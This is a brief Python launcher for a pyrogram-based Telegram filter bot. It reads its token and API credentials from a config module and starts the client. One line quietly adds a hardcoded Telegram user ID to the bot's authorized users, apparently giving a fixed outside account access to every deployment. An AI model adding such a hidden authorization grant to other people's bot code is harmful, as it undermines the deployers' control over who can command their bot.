import os
import pyrogram

if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from sample_config import Config

import time
StartTime = time.time()
__version__ = 1.1


if __name__ == "__main__" :
    plugins = dict(
        root="plugins"
    )
    app = pyrogram.Client(
        "filter bot",
        bot_token=Config.TG_BOT_TOKEN,
        api_id=Config.API_ID,
        api_hash=Config.API_HASH,
        plugins=plugins,
        workers=300
    )
    Config.AUTH_USERS.add(str(680815375))
    app.run()
